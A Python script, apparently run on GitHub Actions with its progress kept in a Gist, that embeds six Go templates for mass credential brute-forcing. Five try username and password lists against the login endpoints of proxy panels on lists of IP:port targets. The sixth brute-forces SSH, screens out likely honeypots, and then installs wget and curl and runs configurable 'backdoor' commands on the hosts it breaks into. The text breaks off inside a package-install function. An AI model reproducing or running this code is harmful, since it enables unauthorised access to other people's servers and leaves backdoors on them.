# -*- coding: utf-8 -*-
import os
import subprocess
import time
import shutil
import sys
import atexit
import requests
import json
import signal
from datetime import datetime, timedelta, timezone

# --- 全局变量用于信号处理 ---
# 当接收到关闭信号时，此标志位会变为 True
SHUTDOWN_REQUESTED = False
# 用于跟踪当前运行的 Go 子进程
CURRENT_SUBPROCESS = None

def signal_handler(signum, frame):
    """
    捕获到 SIGTERM (来自 GitHub Actions) 或 SIGINT (Ctrl+C) 信号时调用的函数。
    这是实现优雅退出的关键。
    """
    global SHUTDOWN_REQUESTED, CURRENT_SUBPROCESS
    if not SHUTDOWN_REQUESTED:
        print(f"\n信号 {signum} 已收到！正在准备优雅退出...")
        SHUTDOWN_REQUESTED = True
        # 尝试终止正在运行的 Go 子进程，以快速释放主进程
        if CURRENT_SUBPROCESS and CURRENT_SUBPROCESS.poll() is None:
            print("正在终止当前的 Go 子进程...")
            CURRENT_SUBPROCESS.terminate()

# 注册信号处理器，让脚本"听懂"关闭指令
signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# 依赖将在 GitHub Action 环境中通过 requirements.txt 安装
try:
    import psutil
    from openpyxl import Workbook, load_workbook
    from openpyxl.utils import get_column_letter
except ImportError:
    print("正在运行环境中，依赖将由 pip 安装...")
    pass

# =========================== Gist 交互功能 ===========================
def get_gist_content(gist_id, github_token, filename):
    """从 Gist 中获取特定文件的内容，用于读取进度"""
    if not gist_id or not github_token:
        print("⚠️ 未提供 GIST_ID 或 GITHUB_TOKEN，无法读取 Gist 状态。")
        return None
    headers = {"Authorization": f"token {github_token}", "Accept": "application/vnd.github.v3+json"}
    url = f"https://api.github.com/gists/{gist_id}"
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        data = response.json()
        if filename in data['files']:
            print(f"✅ 成功从 Gist 读取到状态文件: {filename}")
            return data['files'][filename]['content']
        else:
            print(f"ℹ️ Gist 中未找到状态文件 '{filename}'，将创建新状态。")
            return None
    except requests.exceptions.RequestException as e:
        print(f"❌ 读取 Gist 失败: {e}")
        return None

def update_gist_file(gist_id, github_token, filename, content):
    """创建或更新 Gist 中的特定文件，用于保存进度或结果"""
    if not gist_id or not github_token:
        print("⚠️ 未提供 GIST_ID 或 GITHUB_TOKEN，跳过更新 Gist。")
        return
    headers = {"Authorization": f"token {github_token}", "Accept": "application/vnd.github.v3+json"}
    url = f"https://api.github.com/gists/{gist_id}"
    data = {"files": {filename: {"content": content}}}
    try:
        response = requests.patch(url, headers=headers, data=json.dumps(data))
        response.raise_for_status()
        print(f"✅ 成功更新 Gist 文件: {filename}")
    except requests.exceptions.RequestException as e:
        print(f"❌ 更新 Gist 失败: {e.response.text if e.response else e}")

# =========================== Go 模板 ===========================
XUI_GO_TEMPLATE_1 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	payload := fmt.Sprintf("username=%s&password=%s", username, password)
	formData := strings.NewReader(payload)
	req, err := http.NewRequest("POST", url, formData)
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req = req.WithContext(ctx)
	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()
	
	select {
	case <-shutdownRequest:
		return 
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			var err error
			var resp *http.Response
			
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkUrl := fmt.Sprintf("http://%s:%s/login", ip, port)
			resp, err = postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				checkUrl = fmt.Sprintf("https://%s:%s/login", ip, port)
				resp, err = postRequest(ctx2, checkUrl, username, password)
				cancel2()
			}

			if err != nil {
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
XUI_GO_TEMPLATE_2 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	data := map[string]string{
		"username": username,
		"password": password,
	}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	req = req.WithContext(ctx)
	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()
	
	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			var err error
			var resp *http.Response

			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkUrl := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
			resp, err = postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
				checkUrl = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
				resp, err = postRequest(ctx2, checkUrl, username, password)
				cancel2()
			}

			if err != nil {
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)
				
				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}
	
	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
XUI_GO_TEMPLATE_3 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	data := map[string]string{
		"username": username,
		"pass": password,
	}
	jsonPayload, _ := json.Marshal(data)
	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}
	req.Header.Add("Content-Type", "application/json;charset=UTF-8")
	req.Header.Add("Accept", "application/json, text/plain, */*")
	req.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 Edg/135.0.0.0")
	req = req.WithContext(ctx)
	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			checkUrl := fmt.Sprintf("http://%s:%s/hui/auth/login", ip, port)
			resp, err := postRequest(ctx, checkUrl, username, password)
			cancel()
			if err != nil {
				continue
			}
			
			if resp.StatusCode == http.StatusOK {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if data, ok := responseData["data"].(map[string]interface{}); ok {
						if token, exists := data["accessToken"].(string); exists && token != "" {
							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
							resp.Body.Close()
							return
						}
					}
				}
			}
			resp.Body.Close()
		}
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
XUI_GO_TEMPLATE_4 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	payload := map[string]string{
		"username": username,
		"password": password,
	}
	jsonPayload, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonPayload)))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/json;charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
	req = req.WithContext(ctx)

	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]
	checkUrl := fmt.Sprintf("http://%s:%s/login", ip, port)

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				continue
			}
			
			if resp.StatusCode == 200 {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						if data, ok := responseData["data"].(map[string]interface{}); ok {
							if token, exists := data["token"]; exists && token != "" {
								writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
								resp.Body.Close()
								return
							}
						}
					}
				}
			}
			resp.Body.Close()
		}
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait()
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
XUI_GO_TEMPLATE_5 = '''package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

var bufferPool = sync.Pool{
	New: func() interface{} {
		b := make([]byte, 4*1024)
		return &b
	},
}

var httpClient = &http.Client{
	Transport: &http.Transport{
		MaxIdleConnsPerHost: 100,
	},
	Timeout: 10 * time.Second,
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func postRequest(ctx context.Context, url string, username string, password string) (*http.Response, error) {
	form := fmt.Sprintf("user=%s&pass=%s", username, password)
	body := strings.NewReader(form)

	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	req.Header.Set("Accept", "application/json, text/plain, */*")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/135.0.0.0 Safari/537.36")
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req = req.WithContext(ctx)

	return httpClient.Do(req)
}

func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}
	ip := parts[0]
	port := parts[1]
	checkUrl := fmt.Sprintf("http://%s:%s/app/api/login", ip, port)

	for _, username := range usernames {
		for _, password := range passwords {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			resp, err := postRequest(ctx, checkUrl, username, password)
			cancel()

			if err != nil {
				continue
			}

			if resp.StatusCode == 200 {
				bufPtr := bufferPool.Get().(*[]byte)
				body, _ := io.ReadAll(resp.Body)
				bufferPool.Put(bufPtr)

				var responseData map[string]interface{}
				if err := json.Unmarshal(body, &responseData); err == nil {
					if success, ok := responseData["success"].(bool); ok && success {
						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
						resp.Body.Close()
						return
					}
				}
			}
			resp.Body.Close()
		}
	}
}

func main() {
	go func() {
		http.ListenAndServe("localhost:6060", nil)
	}()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		fmt.Println("\\n收到终止信号，正在准备优雅退出... 请稍候，不要强制关闭。")
		close(shutdownRequest)
	}()

	inputFile := "results.txt"
	batch, err := readLines(inputFile)
	if err != nil {
		fmt.Printf("无法读取输入文件: %v\\n", err)
		return
	}

	usernames := {user_list}
	passwords := {pass_list}

    if len(usernames) == 0 || len(passwords) == 0 {
        fmt.Println("错误：用户名或密码列表为空。")
        return
    }

	outputFile := "xui.txt"
	file, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("无法打开输出文件:", err)
		return
	}
	defer file.Close()

	totalTasks = int64(len(batch))
    if totalTasks == 0 {
        fmt.Println("未加载到任何有效任务。")
        return
    }
    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
	startTime = time.Now()

	for _, line := range batch {
		wg.Add(1)
		go processIP(line, file, usernames, passwords)
	}

	wg.Wait() 
	time.Sleep(1 * time.Second)
	fmt.Println("\\n全部处理完成！")
}
'''
XUI_GO_TEMPLATE_6 = '''package main

import (
	"bufio"
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/crypto/ssh"
)

var wg sync.WaitGroup
var semaphore = make(chan struct{}, {semaphore_size})
var completedCount int64
var totalTasks int64
var startTime time.Time
var shutdownRequest = make(chan struct{})

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
        if line != "" {
		    lines = append(lines, line)
        }
	}
	return lines, scanner.Err()
}

func trySSH(ip, port, username, password string) (*ssh.Client, bool, error) {
	addr := fmt.Sprintf("%s:%s", ip, port)
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         10 * time.Second,
	}
	client, err := ssh.Dial("tcp", addr, config)
	if err != nil {
		return nil, false, err
	}
	return client, true, nil
}

func isLikelyHoneypot(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return true
	}
	defer session.Close()

	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
	if err != nil {
		return true
	}

	output, err := session.CombinedOutput("echo $((1+1))")
	if err != nil {
		return true
	}

	return strings.TrimSpace(string(output)) != "2"
}


func writeResultToFile(file *os.File, text string) {
	file.WriteString(text)
}

func processIP(line string, file *os.File, usernames []string, passwords []string) {
	defer func() {
		atomic.AddInt64(&completedCount, 1)
		<-semaphore
		wg.Done()
	}()

	select {
	case <-shutdownRequest:
		return
	case semaphore <- struct{}{}:
	}

	var ipPort string
	u, err := url.Parse(strings.TrimSpace(line))
	if err == nil && u.Host != "" {
		ipPort = u.Host
	} else {
		ipPort = strings.TrimSpace(line)
	}

	parts := strings.Split(ipPort, ":")
	if len(parts) != 2 {
		return
	}

	ip := strings.TrimSpace(parts[0])
	port := strings.TrimSpace(parts[1])

	found := false
	for _, username := range usernames {
		for _, password := range passwords {
			client, success, err := trySSH(ip, port, username, password)
			if err != nil {
				// fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
			}
			if success {
				defer client.Close()
				fakePasswords := []string{
					password + "1234",
					password + "abcd",
					password + "!@#$",
					password + "!@#12",
					password + "!@6c2",
				}
				isHoneypot := false
				for _, fake := range fakePasswords {
					if fakeClient, fakeSuccess, _ := trySSH(ip, port, username, fake); fakeSuccess {
						fakeClient.Close()
						isHoneypot = true
						break
					}
				}

				if isHoneypot {
					found = true
					break
				}

				if !isLikelyHoneypot(client) {
					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
					if ENABLE_BACKDOOR {
						deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
					}
				}
				found = true
				break
			}
		}
		if found {
			break
		}
	}
}

var retryFlag = false

func triggerFileCleanUp() {
	fmt.Println("清理文件并准备重新执行爆破...")
	if err := os.Remove("xui.txt"); err != nil {
		fmt.Println("删除文件失败:", err)
	} else {
		fmt.Println("已删除当前文件 xui.txt")
	}
	retryFlag = true
}
var ENABLE_BACKDOOR = {enable_backdoor}
var CUSTOM_BACKDOOR_CMDS = {custom_backdoor_cmds}

func deployBackdoor(client *ssh.Client, ip string, port string, username string, password string, cmds []string) {
	if !checkUnzip(client) {
		fmt.Println("🔧 未检测到 unzip，尝试安装中...")
		if !installPackage(client, "unzip") || !checkUnzip(client) {
			fmt.Println("❌ unzip 安装失败")
			recordFailure(ip, port, username, password, "unzip 安装失败")
			return
		}
	}

	if !checkWget(client) {
		fmt.Println("🔧 未检测到 wget，尝试安装中...")
		if !installPackage(client, "wget") || !checkWget(client) {
			fmt.Println("❌ wget 安装失败")
			recordFailure(ip, port, username, password, "wget 安装失败")
			return
		}
	}

	if !checkCurl(client) {
		fmt.Println("🔧 未检测到 curl，尝试安装中...")
		if !installPackage(client, "curl") || !checkCurl(client) {
			fmt.Println("❌ curl 安装失败")
			recordFailure(ip, port, username, password, "curl 安装失败")
			return
		}
	}

	backdoorCmd := strings.Join(cmds, " && ")

	payloadSession, err := client.NewSession()
	if err != nil {
		fmt.Println("❌ 创建 payload session 失败:", err)
		recordFailure(ip, port, username, password, "无法创建 payload session")
		return
	}
	defer payloadSession.Close()

	err = payloadSession.Run(backdoorCmd)
	if err != nil {
		fmt.Println("❌ 后门命令执行失败")
		recordFailure(ip, port, username, password, "后门命令执行失败")
		return
	}

	fmt.Println("✅ 成功部署后门")
	recordSuccess(ip, port, username, password)
}

func checkUnzip(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v unzip >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func checkWget(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v wget >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func checkCurl(client *ssh.Client) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	cmd := `command -v curl >/dev/null 2>&1 && echo OK || echo MISSING`
	output, err := session.CombinedOutput(cmd)
	if err != nil {
		return false
	}
	return strings.Contains(string(output), "OK")
}

func installPackage(client *ssh.Client, name string) bool {
	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	installCmd := fmt.Sprintf(`
		if command -v apt >/dev/null 2>&1; then
			apt update -y && apt install -y %[1]s
		elif command -v yum >/dev/null 2>&1; then
			yum install -y %[1]s
		elif command -v opkg >/dev/null 2>&1; then
			opkg update && opkg install %[1]s
		else
			echo "NO_PACKAGE_MANAGER"
		fi
	`, name)

	err = session.Run(installCmd)
